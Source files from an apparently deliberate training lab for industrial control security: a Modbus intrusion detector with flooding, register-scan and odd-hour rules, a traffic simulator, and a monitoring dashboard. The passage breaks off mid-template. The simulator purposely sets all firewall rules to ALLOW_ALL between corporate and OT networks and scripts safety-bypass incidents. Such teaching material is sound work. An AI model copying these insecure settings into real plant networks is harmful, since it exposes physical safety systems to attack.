                        'function_code': event.function_code,
                        'value': event.value
                    }
                ))

        return alerts

    def _check_rate_limiting(self, event: ModbusEvent) -> List[Alert]:
        """Detect flooding/rapid-fire attacks"""
        alerts = []

        # Track events per source IP
        key = event.source_ip
        self.rate_tracker[key].append(event.timestamp)

        # Check if more than 50 events in last 1 second
        recent = [t for t in self.rate_tracker[key] if event.timestamp - t < 1.0]

        if len(recent) > 50:
            alerts.append(Alert(
                timestamp=event.timestamp,
                severity='HIGH',
                alert_type='RATE_LIMIT_EXCEEDED',
                description=f'Flooding detected: {len(recent)} requests/sec from {event.source_ip}',
                source_ip=event.source_ip,
                details={'rate': len(recent)}
            ))

        return alerts

    def _check_scan_pattern(self, event: ModbusEvent) -> List[Alert]:
        """Detect sequential register scanning"""
        alerts = []

        # Get recent events from same source
        source_events = [e for e in self.recent_events
                        if e.source_ip == event.source_ip
                        and event.timestamp - e.timestamp < 5.0]

        if len(source_events) >= 10:
            # Check if addresses are sequential
            addresses = [e.address for e in source_events[-10:]]
            if self._is_sequential(addresses):
                alerts.append(Alert(
                    timestamp=event.timestamp,
                    severity='MEDIUM',
                    alert_type='REGISTER_SCAN',
                    description=f'Sequential register scan detected from {event.source_ip}',
                    source_ip=event.source_ip,
                    details={'addresses': addresses}
                ))

        return alerts

    def _check_timing_anomaly(self, event: ModbusEvent) -> List[Alert]:
        """Detect timing-based anomalies"""
        alerts = []

        # Check for commands at unusual times (e.g., 2-5 AM)
        hour = datetime.fromtimestamp(event.timestamp).hour
        if 2 <= hour < 5:
            # Check if this is unusual for this source
            if self.baseline['source_ips'][event.source_ip] > 100:
                # Established source acting at odd hours
                alerts.append(Alert(
                    timestamp=event.timestamp,
                    severity='LOW',
                    alert_type='UNUSUAL_TIME',
                    description=f'Command from {event.source_ip} at unusual hour: {hour}:00',
                    source_ip=event.source_ip,
                    details={'hour': hour}
                ))

        return alerts

    def _is_sequential(self, addresses: List[int], max_gap: int = 2) -> bool:
        """Check if addresses are roughly sequential"""
        if len(addresses) < 5:
            return False

        gaps = [addresses[i+1] - addresses[i] for i in range(len(addresses)-1)]
        return all(0 < gap <= max_gap for gap in gaps)

    def _log_alert(self, alert: Alert):
        """Log alert to console and shared state"""
        severity_symbol = {
            'LOW': 'âš ï¸',
            'MEDIUM': 'âš ï¸âš ï¸',
            'HIGH': 'ðŸš¨',
            'CRITICAL': 'ðŸš¨ðŸš¨ðŸš¨'
        }

        symbol = severity_symbol.get(alert.severity, 'âš ï¸')
        log.warning(f"{symbol} [{alert.severity}] {alert.alert_type}: {alert.description}")

        # Store in shared state
        alert_log = shared_state.get_state('modbus_ids_alerts', [])
        alert_log.append({
            'timestamp': datetime.fromtimestamp(alert.timestamp).strftime('%Y-%m-%d %H:%M:%S'),
            'severity': alert.severity,
            'type': alert.alert_type,
            'description': alert.description,
            'source_ip': alert.source_ip,
            'details': alert.details
        })

        # Keep only last 100 alerts
        if len(alert_log) > 100:
            alert_log = alert_log[-100:]

        shared_state.update_state('modbus_ids_alerts', alert_log)

    def _monitor_loop(self):
        """Background monitoring loop"""
        while self.running:
            try:
                # Periodic analysis of traffic patterns
                self._analyze_baseline()

                # Check for persistent threats
                self._check_persistent_threats()

                time.sleep(10)  # Check every 10 seconds

            except Exception as e:
                log.error(f"[Modbus IDS] Monitor loop error: {e}")

    def _analyze_baseline(self):
        """Analyze traffic baseline for anomalies"""
        # Update statistics in shared state
        stats = {
            'total_events': sum(self.baseline['function_codes'].values()),
            'unique_sources': len(self.baseline['source_ips']),
            'total_alerts': len(self.alerts),
            'recent_alerts': len([a for a in self.alerts if time.time() - a.timestamp < 60])
        }

        shared_state.update_state('modbus_ids_stats', stats)

    def _check_persistent_threats(self):
        """Check for persistent malicious activity"""
        # Count alerts per source IP in last hour
        one_hour_ago = time.time() - 3600
        recent_alerts = [a for a in self.alerts if a.timestamp > one_hour_ago]

        alert_counts = defaultdict(int)
        for alert in recent_alerts:
            alert_counts[alert.source_ip] += 1

        # Alert if any source has >10 alerts in last hour
        for source_ip, count in alert_counts.items():
            if count > 10:
                log.error(f"ðŸš¨ðŸš¨ðŸš¨ PERSISTENT THREAT: {source_ip} has {count} alerts in last hour")

    def get_alerts(self, last_n: int = 20) -> List[Dict]:
        """Get recent alerts"""
        return list(self.alerts)[-last_n:]

    def get_statistics(self) -> Dict:
        """Get IDS statistics"""
        return {
            'enabled': self.enabled,
            'total_events': sum(self.baseline['function_codes'].values()),
            'total_alerts': len(self.alerts),
            'function_code_distribution': dict(self.baseline['function_codes']),
            'source_distribution': dict(self.baseline['source_ips']),
            'recent_alerts': len([a for a in self.alerts if time.time() - a.timestamp < 300])
        }

    def add_authorized_writer(self, ip: str):
        """Add IP to authorized writers list"""
        self.authorized_writers.add(ip)
        log.info(f"[Modbus IDS] Added authorized writer: {ip}")

    def add_protected_address(self, address: int):
        """Mark an address as protected"""
        self.protected_addresses.add(address)
        log.info(f"[Modbus IDS] Protected address: {address}")

    # =========================================================================
    # PCAP Capture Methods
    # =========================================================================

    def start_packet_capture(self, interface: str = 'any'):
        """Start capturing Modbus TCP packets"""
        if not self.pcap_enabled:
            return

        if self.capture_running:
            log.warning("[PCAP] Capture already running")
            return

        self.capture_running = True
        self.current_pcap_file = self._get_pcap_filename()

        # Start capture thread
        self.capture_thread = threading.Thread(
            target=self._capture_loop,
            args=(interface,),
            daemon=True
        )
        self.capture_thread.start()

        log.info(f"[PCAP] Started packet capture on {interface}, writing to {self.current_pcap_file}")

    def stop_packet_capture(self):
        """Stop packet capture and save remaining packets"""
        if not self.capture_running:
            return

        self.capture_running = False

        # Wait for capture thread to finish
        if self.capture_thread:
            self.capture_thread.join(timeout=5.0)

        # Save any remaining packets
        if self.packet_buffer:
            self._save_pcap()

        log.info(f"[PCAP] Stopped packet capture. Total packets: {self.packets_captured}")

    def _capture_loop(self, interface: str):
        """Main packet capture loop"""
        try:
            # Capture filter for Modbus TCP (port 502)
            filter_str = "tcp port 502"

            # Start sniffing
            sniff(
                iface=interface,
                filter=filter_str,
                prn=self._packet_handler,
                store=False,
                stop_filter=lambda p: not self.capture_running
            )

        except Exception as e:
            log.error(f"[PCAP] Capture error: {e}")
            self.capture_running = False

    def _packet_handler(self, packet):
        """Handle captured packet"""
        try:
            # Add to buffer
            self.packet_buffer.append(packet)
            self.packets_captured += 1

            # Check if we need to save/rotate
            if len(self.packet_buffer) >= 1000:  # Save every 1000 packets
                self._save_pcap()

            # Check for rotation
            if self._should_rotate_pcap():
                self._rotate_pcap()

        except Exception as e:
            log.error(f"[PCAP] Packet handler error: {e}")

    def _save_pcap(self):
        """Save packet buffer to PCAP file"""
        if not self.packet_buffer:
            return

        try:
            # Append to current PCAP file
            wrpcap(self.current_pcap_file, self.packet_buffer, append=True)
            log.debug(f"[PCAP] Saved {len(self.packet_buffer)} packets to {self.current_pcap_file}")

            # Clear buffer
            self.packet_buffer = []

        except Exception as e:
            log.error(f"[PCAP] Save error: {e}")

    def _should_rotate_pcap(self) -> bool:
        """Check if PCAP file should be rotated"""
        # Time-based rotation
        if time.time() - self.last_pcap_rotation >= self.pcap_rotation_interval:
            return True

        # Size-based rotation
        if self.current_pcap_file and os.path.exists(self.current_pcap_file):
            file_size = os.path.getsize(self.current_pcap_file)
            if file_size >= self.pcap_rotation_size:
                return True

        return False

    def _rotate_pcap(self):
        """Rotate PCAP file"""
        # Save current buffer
        if self.packet_buffer:
            self._save_pcap()

        old_file = self.current_pcap_file
        log.info(f"[PCAP] Rotating PCAP file: {old_file}")

        # Create new file
        self.current_pcap_file = self._get_pcap_filename()
        self.last_pcap_rotation = time.time()

        log.info(f"[PCAP] New PCAP file: {self.current_pcap_file}")

    def _get_pcap_filename(self) -> str:
        """Generate PCAP filename with timestamp"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"modbus_{timestamp}.pcap"
        return os.path.join(self.pcap_dir, filename)

    def get_pcap_stats(self) -> Dict:
        """Get PCAP capture statistics"""
        stats = {
            'enabled': self.pcap_enabled,
            'running': self.capture_running,
            'packets_captured': self.packets_captured,
            'current_file': self.current_pcap_file,
            'buffer_size': len(self.packet_buffer)
        }

        # Get directory stats
        if self.pcap_enabled and os.path.exists(self.pcap_dir):
            pcap_files = [f for f in os.listdir(self.pcap_dir) if f.endswith('.pcap')]
            total_size = sum(os.path.getsize(os.path.join(self.pcap_dir, f)) for f in pcap_files)

            stats['total_files'] = len(pcap_files)
            stats['total_size_mb'] = total_size / (1024 * 1024)

        return stats


# Example usage and testing
if __name__ == '__main__':
    ids = ModbusIDS()

    # Configure policies
    ids.add_authorized_writer('192.168.100.20')  # HMI server
    ids.add_authorized_writer('192.168.100.30')  # Engineering workstation
    ids.add_protected_address(10)  # Critical safety register

    # Start monitoring
    ids.start()

    # Simulate some events
    print("\n=== Testing Modbus IDS ===\n")

    # Legitimate read
    event1 = ModbusEvent(
        timestamp=time.time(),
        source_ip='192.168.100.20',
        dest_ip='192.168.100.10',
        function_code=3,
        address=0
    )
    alerts = ids.analyze_event(event1)
    print(f"Legitimate read: {len(alerts)} alerts")

    # Unauthorized write
    event2 = ModbusEvent(
        timestamp=time.time(),
        source_ip='192.168.1.100',  # Unauthorized
        dest_ip='192.168.100.10',
        function_code=6,
        address=5,
        value=9999
    )
    alerts = ids.analyze_event(event2)
    print(f"Unauthorized write: {len(alerts)} alerts")

    # Invalid function code
    event3 = ModbusEvent(
        timestamp=time.time(),
        source_ip='192.168.100.20',
        dest_ip='192.168.100.10',
        function_code=99,  # Invalid
        address=0
    )
    alerts = ids.analyze_event(event3)
    print(f"Invalid function code: {len(alerts)} alerts")

    # Flooding attack
    print("\nSimulating flooding attack...")
    for i in range(60):
        event = ModbusEvent(
            timestamp=time.time(),
            source_ip='192.168.1.100',
            dest_ip='192.168.100.10',
            function_code=3,
            address=i
        )
        alerts = ids.analyze_event(event)
        time.sleep(0.01)

    print(f"\nTotal alerts: {len(ids.alerts)}")
    print("\nRecent alerts:")
    for alert in ids.get_alerts(last_n=5):
        print(f"  [{alert.severity}] {alert.alert_type}: {alert.description}")

    print("\nStatistics:")
    stats = ids.get_statistics()
    for key, value in stats.items():
        print(f"  {key}: {value}")

    ids.stop()



================================================================================
FILE: monitoring/network_simulator.py
================================================================================
#!/usr/bin/env python3
"""
ICS Network Traffic Simulator
Generates realistic industrial network traffic with intentional security issues

Simulates:
- CorpNet (192.168.1.0/24)
- OT Zone (192.168.100.0/24)
- DMZ (192.168.50.0/24)
- Lack of proper segmentation
- Realistic traffic patterns
- Network issues (packet loss, misbehaving devices)
- Safety incidents
"""

import socket
import struct
import random
import time
import threading
import logging
from datetime import datetime
import os
import sys
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))
from core import shared_state

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

# Network Topology (INTENTIONALLY INSECURE)
NETWORK_SEGMENTS = {
    'corpnet': {
        'subnet': '192.168.1.0/24',
        'devices': {
            'employee_laptop': '192.168.1.100',
            'email_server': '192.168.1.10',
            'file_server': '192.168.1.20',
            'printer': '192.168.1.30'
        }
    },
    'ot_zone': {
        'subnet': '192.168.100.0/24',
        'devices': {
            'plc1': '192.168.100.10',  # Tank Control
            'plc2': '192.168.100.11',  # Pressure Control
            'plc3': '192.168.100.12',  # Temperature Control
            'plc4': '192.168.100.13',  # Safety/ESD
            'hmi_server': '192.168.100.20',
            'engineering_ws': '192.168.100.30',
            'misbehaving_device': '192.168.100.99'  # Problematic device
        }
    },
    'dmz': {
        'subnet': '192.168.50.0/24',
        'devices': {
            'historian': '192.168.50.10',
            'web_portal': '192.168.50.20'
        }
    }
}

# VULNERABILITY: No firewall rules between segments
FIREWALL_RULES = {
    'corpnet_to_ot': 'ALLOW_ALL',  # Should be DENY
    'ot_to_corpnet': 'ALLOW_ALL',  # Should be DENY
    'corpnet_to_dmz': 'ALLOW_ALL',
    'ot_to_dmz': 'ALLOW_ALL',
    'dmz_to_ot': 'ALLOW_ALL'  # Should be RESTRICTED
}

# Traffic patterns
TRAFFIC_PATTERNS = {
    'hmi_polling': {
        'source': 'hmi_server',
        'destinations': ['plc1', 'plc2', 'plc3', 'plc4'],
        'protocol': 'modbus',
        'interval': 1.0,  # Poll every second
        'description': 'HMI polling PLCs for real-time data'
    },
    'historian_collection': {
        'source': 'historian',
        'destinations': ['plc1', 'plc2', 'plc3', 'plc4'],
        'protocol': 'modbus',
        'interval': 5.0,  # Every 5 seconds
        'description': 'Historian collecting time-series data'
    },
    'engineering_access': {
        'source': 'engineering_ws',
        'destinations': ['plc1', 'plc2', 'plc3', 'plc4'],
        'protocol': 'modbus',
        'interval': random.uniform(30, 300),  # Occasional access
        'description': 'Engineer accessing PLC registers'
    },
    'corpnet_intrusion': {
        'source': 'employee_laptop',
        'destinations': ['plc1', 'hmi_server'],
        'protocol': 'modbus',
        'interval': random.uniform(60, 600),  # Suspicious access
        'description': 'VULNERABILITY: Corp user accessing OT network'
    },
    'misbehaving_device_spam': {
        'source': 'misbehaving_device',
        'destinations': ['plc1', 'plc2', 'plc3', 'plc4', 'hmi_server'],
        'protocol': 'modbus',
        'interval': 0.1,  # Too frequent - causing issues
        'description': 'Faulty device spamming network'
    }
}

# Packet loss simulation
PACKET_LOSS_RATE = 0.02  # 2% packet loss

# Safety incident scenarios
SAFETY_INCIDENTS = [
    {
        'name': 'pressure_runaway',
        'trigger_time': 300,  # 5 minutes after start
        'description': 'PLC-2 pressure vessel exceeds safe limits',
        'actions': [
            ('plc2_pressure_vessel_1', 180.0),  # Dangerously high
            ('plc2_safety_interlock_1', False)
        ]
    },
    {
        'name': 'thermal_incident',
        'trigger_time': 600,  # 10 minutes
        'description': 'PLC-3 thermal runaway condition',
        'actions': [
            ('plc3_thermal_runaway', True),
            ('plc3_zone1_temp', 150.0)
        ]
    },
    {
        'name': 'safety_bypass',
        'trigger_time': 900,  # 15 minutes
        'description': 'Safety system compromised',
        'actions': [
            ('plc4_safety_bypass_mode', True),
            ('plc4_watchdog_enabled', False)
        ]
    }
]

class NetworkTrafficSimulator:
    def __init__(self):
        self.running = False
        self.start_time = time.time()
        shared_state.init_state()

    def simulate_modbus_traffic(self, source, destination, function_code=3):
        """Simulate Modbus TCP traffic"""
        # Simulate packet loss
        if random.random() < PACKET_LOSS_RATE:
            log.warning(f"[PACKET LOSS] {source} -> {destination}")
            return False

        # Get device IPs
        source_ip = self.get_device_ip(source)
        dest_ip = self.get_device_ip(destination)

        if not source_ip or not dest_ip:
            return False

        # Log traffic
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
        log.info(f"[{timestamp}] Modbus: {source_ip}:{random.randint(49152, 65535)} -> {dest_ip}:502 FC={function_code}")

        # Store in shared state for IDS analysis
        traffic_entry = {
            'timestamp': timestamp,
            'source': source_ip,
            'destination': dest_ip,
            'protocol': 'modbus',
            'function_code': function_code
        }

        # Add to traffic log
        traffic_log = shared_state.get_state('network_traffic_log', [])
        traffic_log.append(traffic_entry)

        # Keep only last 100 entries (reduced to limit state file size)
        if len(traffic_log) > 100:
            traffic_log = traffic_log[-100:]

        shared_state.update_state('network_traffic_log', traffic_log)

        return True

    def get_device_ip(self, device_name):
        """Get IP address for a device"""
        for segment in NETWORK_SEGMENTS.values():
            if device_name in segment['devices']:
                return segment['devices'][device_name]
        return None

    def hmi_polling_thread(self):
        """Simulate HMI polling all PLCs"""
        pattern = TRAFFIC_PATTERNS['hmi_polling']
        while self.running:
            for plc in pattern['destinations']:
                self.simulate_modbus_traffic(pattern['source'], plc, function_code=3)  # Read holding registers
            time.sleep(pattern['interval'])

    def historian_collection_thread(self):
        """Simulate historian collecting data"""
        pattern = TRAFFIC_PATTERNS['historian_collection']
        while self.running:
            for plc in pattern['destinations']:
                self.simulate_modbus_traffic(pattern['source'], plc, function_code=4)  # Read input registers
            time.sleep(pattern['interval'])

    def engineering_access_thread(self):
        """Simulate occasional engineering workstation access"""
        pattern = TRAFFIC_PATTERNS['engineering_access']
        while self.running:
            plc = random.choice(pattern['destinations'])
            fc = random.choice([3, 4, 6, 16])  # Read/Write operations
            self.simulate_modbus_traffic(pattern['source'], plc, function_code=fc)
            time.sleep(random.uniform(30, 300))

    def corpnet_intrusion_thread(self):
        """VULNERABILITY: Simulate unauthorized corporate network access to OT"""
        pattern = TRAFFIC_PATTERNS['corpnet_intrusion']
        while self.running:
            # This should be blocked by firewall but isn't
            dest = random.choice(pattern['destinations'])
            self.simulate_modbus_traffic(pattern['source'], dest, function_code=3)
            log.warning(f"[SECURITY] Unauthorized CorpNet -> OT traffic detected!")
            time.sleep(random.uniform(60, 600))

    def misbehaving_device_thread(self):
        """Simulate a faulty device causing network issues"""
        pattern = TRAFFIC_PATTERNS['misbehaving_device_spam']
        while self.running:
            # Spam the network with unnecessary traffic
            for _ in range(10):  # Burst of 10 packets
                dest = random.choice(pattern['destinations'])
                self.simulate_modbus_traffic(pattern['source'], dest, function_code=3)
            time.sleep(pattern['interval'])

    def safety_incident_monitor(self):
        """Monitor for and trigger safety incidents"""
        while self.running:
            elapsed = time.time() - self.start_time

            for incident in SAFETY_INCIDENTS:
                if abs(elapsed - incident['trigger_time']) < 5:  # Within 5 seconds of trigger time
                    log.error(f"[SAFETY INCIDENT] {incident['name']}: {incident['description']}")

                    # Execute incident actions
                    for key, value in incident['actions']:
                        shared_state.update_state(key, value)
                        log.error(f"  -> Set {key} = {value}")

            time.sleep(5)

    def network_statistics_thread(self):
        """Calculate and log network statistics"""
        while self.running:
            time.sleep(60)  # Every minute

            traffic_log = shared_state.get_state('network_traffic_log', [])

            if traffic_log:
                # Calculate statistics
                total_packets = len(traffic_log)
                last_minute = [t for t in traffic_log if self._within_last_minute(t['timestamp'])]

                log.info(f"[STATS] Total packets: {total_packets}, Last minute: {len(last_minute)}")

                # Detect anomalies
                if len(last_minute) > 100:
                    log.warning(f"[ANOMALY] High traffic rate detected: {len(last_minute)} packets/min")

    def _within_last_minute(self, timestamp_str):
        """Check if timestamp is within last minute"""
        try:
            ts = datetime.strptime(timestamp_str, '%Y-%m-%d %H:%M:%S.%f')
            now = datetime.now()
            return (now - ts).total_seconds() < 60
        except:
            return False

    def start(self):
        """Start all network simulation threads"""
        self.running = True
        self.start_time = time.time()

        log.info("=" * 70)
        log.info("ICS Network Traffic Simulator Starting")
        log.info("=" * 70)
        log.info("Network Topology:")
        for segment_name, segment_info in NETWORK_SEGMENTS.items():
            log.info(f"  {segment_name.upper()}: {segment_info['subnet']}")
            for device, ip in segment_info['devices'].items():
                log.info(f"    {device}: {ip}")
        log.info("")
        log.info("Firewall Status: MISCONFIGURED")
        for rule, policy in FIREWALL_RULES.items():
            log.info(f"  {rule}: {policy}")
        log.info("")
        log.info("Traffic Patterns:")
        for pattern_name, pattern in TRAFFIC_PATTERNS.items():
            log.info(f"  {pattern_name}: {pattern['description']}")
        log.info("=" * 70)

        # Start traffic threads
        threads = [
            threading.Thread(target=self.hmi_polling_thread, daemon=True),
            threading.Thread(target=self.historian_collection_thread, daemon=True),
            threading.Thread(target=self.engineering_access_thread, daemon=True),
            threading.Thread(target=self.corpnet_intrusion_thread, daemon=True),
            threading.Thread(target=self.misbehaving_device_thread, daemon=True),
            threading.Thread(target=self.safety_incident_monitor, daemon=True),
            threading.Thread(target=self.network_statistics_thread, daemon=True)
        ]

        for thread in threads:
            thread.start()

        log.info("All traffic simulation threads started")
        log.info("Monitoring for safety incidents...")

        # Keep main thread alive
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop()

    def stop(self):
        """Stop the simulator"""
        log.info("Stopping network simulator...")
        self.running = False

if __name__ == '__main__':
    simulator = NetworkTrafficSimulator()
    simulator.start()



================================================================================
FILE: monitoring/system_monitor.py
================================================================================
#!/usr/bin/env python3
"""
System Monitoring Dashboard
Real-time monitoring of all ICS components:
- PLC engines (scan cycles, diagnostics)
- Modbus IDS (alerts, statistics)
- Protocol servers (S7, Modbus)
- Network traffic
- Security events
"""

import time
import threading
import logging
from datetime import datetime
from typing import Dict, List
import os
import sys
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))
from core import shared_state

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

class SystemMonitor:
    """
    Central monitoring system for ICS infrastructure

    Monitors:
    - PLC scan cycles and health
    - Security alerts from IDS
    - Protocol traffic patterns
    - System resource usage
    - Anomaly detection
    """

    def __init__(self):
        self.running = False
        self.thread = None
        self.start_time = time.time()

        # Metrics tracking
        self.metrics = {
            'plc_engines': {},
            'modbus_ids': {},
            's7_servers': {},
            'network': {},
            'security': {
                'total_alerts': 0,
                'critical_alerts': 0,
                'last_alert_time': None
            }
        }

        shared_state.init_state()

    def start(self):
        """Start monitoring"""
        if self.running:
            return

        self.running = True
        self.thread = threading.Thread(target=self._monitor_loop, daemon=True)
        self.thread.start()

        log.info("""
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘          ICS SYSTEM MONITOR - Real-Time Dashboard              â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Monitoring:
  âœ“ PLC Engine Status & Diagnostics
  âœ“ Modbus IDS Alerts & Statistics
  âœ“ S7 Protocol Server Activity
  âœ“ Network Traffic Patterns
  âœ“ Security Events & Anomalies

Dashboard updates every 5 seconds
Press Ctrl+C to stop
        """)

    def stop(self):
        """Stop monitoring"""
        self.running = False
        if self.thread:
            self.thread.join(timeout=2.0)
        log.info("[Monitor] Stopped")

    def _monitor_loop(self):
        """Main monitoring loop"""
        iteration = 0

        while self.running:
            try:
                iteration += 1

                # Collect metrics
                self._collect_plc_metrics()
                self._collect_ids_metrics()
                self._collect_network_metrics()
                self._check_security_status()

                # Display dashboard every 5 seconds
                if iteration % 5 == 0:
                    self._display_dashboard()

                time.sleep(1)

            except Exception as e:
                log.error(f"[Monitor] Error: {e}")

    def _collect_plc_metrics(self):
        """Collect PLC engine metrics"""
        plc_ids = ['plc1', 'plc2', 'plc3', 'plc4']

        for plc_id in plc_ids:
            # Get scan time
            scan_time = shared_state.get_state(f'{plc_id}_scan_time_ms', 0.0)
            scan_count = shared_state.get_state(f'{plc_id}_scan_count', 0)
            plc_state = shared_state.get_state(f'{plc_id}_state', 'UNKNOWN')
            watchdog_fault = shared_state.get_state(f'{plc_id}_watchdog_fault', False)

            self.metrics['plc_engines'][plc_id] = {
                'state': plc_state,
                'scan_time_ms': scan_time,
                'scan_count': scan_count,
                'watchdog_fault': watchdog_fault,
                'health': 'FAULT' if watchdog_fault else 'OK'
            }

    def _collect_ids_metrics(self):
        """Collect Modbus IDS metrics"""
        ids_stats = shared_state.get_state('modbus_ids_stats', {})
        ids_alerts = shared_state.get_state('modbus_ids_alerts', [])

        # Count alerts by severity
        severity_counts = {'LOW': 0, 'MEDIUM': 0, 'HIGH': 0, 'CRITICAL': 0}
        recent_alerts = 0
        five_min_ago = time.time() - 300

        for alert in ids_alerts:
            severity_counts[alert.get('severity', 'LOW')] += 1

            # Count recent alerts (last 5 minutes)
            try:
                alert_time = datetime.strptime(alert['timestamp'], '%Y-%m-%d %H:%M:%S').timestamp()
                if alert_time > five_min_ago:
                    recent_alerts += 1
            except:
                pass

        self.metrics['modbus_ids'] = {
            'total_events': ids_stats.get('total_events', 0),
            'total_alerts': ids_stats.get('total_alerts', 0),
            'recent_alerts': recent_alerts,
            'severity_counts': severity_counts,
            'status': 'ACTIVE' if ids_stats.get('enabled', False) else 'INACTIVE'
        }

        # Update security metrics
        self.metrics['security']['total_alerts'] = ids_stats.get('total_alerts', 0)
        self.metrics['security']['critical_alerts'] = severity_counts['CRITICAL']
        if ids_alerts:
            self.metrics['security']['last_alert_time'] = ids_alerts[-1].get('timestamp')

    def _collect_network_metrics(self):
        """Collect network traffic metrics"""
        traffic_log = shared_state.get_state('network_traffic_log', [])

        # Analyze recent traffic (last 100 entries)
        protocol_counts = {}
        source_counts = {}

        for entry in traffic_log[-100:]:
            protocol = entry.get('protocol', 'unknown')
            source = entry.get('source', 'unknown')

            protocol_counts[protocol] = protocol_counts.get(protocol, 0) + 1
            source_counts[source] = source_counts.get(source, 0) + 1

        self.metrics['network'] = {
            'total_packets': len(traffic_log),
            'recent_packets': len(traffic_log[-100:]),
            'protocol_distribution': protocol_counts,
            'top_sources': dict(sorted(source_counts.items(), key=lambda x: x[1], reverse=True)[:5])
        }

    def _check_security_status(self):
        """Check overall security status"""
        # Check for critical conditions
        critical_conditions = []

        # Check for PLC faults
        for plc_id, metrics in self.metrics['plc_engines'].items():
            if metrics.get('watchdog_fault'):
                critical_conditions.append(f"{plc_id.upper()} watchdog fault")

            if metrics.get('state') == 'ERROR':
                critical_conditions.append(f"{plc_id.upper()} in ERROR state")

        # Check for high alert rate
        ids_metrics = self.metrics.get('modbus_ids', {})
        if ids_metrics.get('recent_alerts', 0) > 10:
            critical_conditions.append(f"High IDS alert rate: {ids_metrics['recent_alerts']}/5min")

        # Check for critical IDS alerts
        if ids_metrics.get('severity_counts', {}).get('CRITICAL', 0) > 0:
            critical_conditions.append(f"{ids_metrics['severity_counts']['CRITICAL']} CRITICAL security alerts")

        # Update security status
        if critical_conditions:
            self.metrics['security']['status'] = 'CRITICAL'
            self.metrics['security']['issues'] = critical_conditions
        else:
            self.metrics['security']['status'] = 'NORMAL'
            self.metrics['security']['issues'] = []

    def _display_dashboard(self):
        """Display real-time dashboard"""
        uptime = time.time() - self.start_time
        uptime_str = time.strftime('%H:%M:%S', time.gmtime(uptime))

        print("\n" + "="*70)
        print(f"ICS SYSTEM MONITOR - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Uptime: {uptime_str}")
        print("="*70)

        # Security Status
        sec = self.metrics['security']
        status_symbol = "ðŸ”´" if sec['status'] == 'CRITICAL' else "ðŸŸ¢"
        print(f"\n{status_symbol} SECURITY STATUS: {sec['status']}")
        print(f"  Total Alerts: {sec['total_alerts']} (Critical: {sec['critical_alerts']})")
        if sec.get('last_alert_time'):
            print(f"  Last Alert: {sec['last_alert_time']}")
        if sec.get('issues'):
            print(f"  âš ï¸  Issues:")
            for issue in sec['issues']:
                print(f"      â€¢ {issue}")

        # PLC Status
        print(f"\nðŸ­ PLC ENGINES:")
        for plc_id, metrics in sorted(self.metrics['plc_engines'].items()):
            state_symbol = "âœ“" if metrics['health'] == 'OK' else "âœ—"
            print(f"  {state_symbol} {plc_id.upper():6s} | State: {metrics['state']:7s} | " +
                  f"Scan: {metrics['scan_time_ms']:6.2f}ms | " +
                  f"Count: {metrics['scan_count']:8d}")

        # Modbus IDS
        ids = self.metrics['modbus_ids']
        print(f"\nðŸ›¡ï¸  MODBUS IDS:")
        print(f"  Status: {ids.get('status', 'UNKNOWN')}")
        print(f"  Events: {ids.get('total_events', 0):,} | Alerts: {ids.get('total_alerts', 0)} " +
              f"(Recent: {ids.get('recent_alerts', 0)})")

        if ids.get('severity_counts'):
            sev = ids['severity_counts']
            print(f"  Severity: LOW={sev['LOW']} MED={sev['MEDIUM']} " +
                  f"HIGH={sev['HIGH']} CRIT={sev['CRITICAL']}")

        # Network Traffic
        net = self.metrics['network']
        print(f"\nðŸ“¡ NETWORK TRAFFIC:")
        print(f"  Total Packets: {net.get('total_packets', 0):,} (Recent: {net.get('recent_packets', 0)})")

        if net.get('protocol_distribution'):
            protocols = net['protocol_distribution']
            proto_str = ", ".join([f"{k}={v}" for k, v in protocols.items()])
            print(f"  Protocols: {proto_str}")

        if net.get('top_sources'):
            print(f"  Top Sources:")
            for source, count in list(net['top_sources'].items())[:3]:
                print(f"    â€¢ {source}: {count} packets")

        print("\n" + "-"*70)

    def get_health_summary(self) -> Dict:
        """Get overall system health summary"""
        # Count healthy vs faulty PLCs
        plc_count = len(self.metrics['plc_engines'])
        plc_healthy = sum(1 for m in self.metrics['plc_engines'].values() if m['health'] == 'OK')

        return {
            'timestamp': datetime.now().isoformat(),
            'uptime_seconds': time.time() - self.start_time,
            'security_status': self.metrics['security']['status'],
            'plc_health': f"{plc_healthy}/{plc_count}",
            'total_alerts': self.metrics['security']['total_alerts'],
            'critical_alerts': self.metrics['security']['critical_alerts'],
            'ids_active': self.metrics['modbus_ids'].get('status') == 'ACTIVE',
            'issues': self.metrics['security'].get('issues', [])
        }


def create_monitoring_dashboard_web():
    """Create simple web dashboard using Flask"""
    from flask import Flask, jsonify, render_template_string

    app = Flask(__name__)
    monitor = SystemMonitor()

    HTML_TEMPLATE = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>ICS System Monitor</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: 'Courier New', monospace;
                background: #0a0a0a;
                color: #0f0;
                padding: 20px;
            }
            .header {
                background: #1a1a1a;
                padding: 20px;
                border: 2px solid #0f0;
                margin-bottom: 20px;
            }
            .status-ok { color: #0f0; }
            .status-critical { color: #f00; }
            .panel {
                background: #1a1a1a;
                border: 1px solid #333;
                padding: 15px;
                margin-bottom: 15px;
            }
            .panel h2 { color: #0ff; margin-bottom: 10px; }
            .metric { padding: 5px 0; }
            .alert { background: #3a0000; border: 1px solid #f00; padding: 10px; margin: 5px 0; }
        </style>
        <script>
            function updateDashboard() {
                fetch('/api/health')
                    .then(r => r.json())
                    .then(data => {
                        document.getElementById('status').textContent = data.security_status;
                        document.getElementById('status').className =
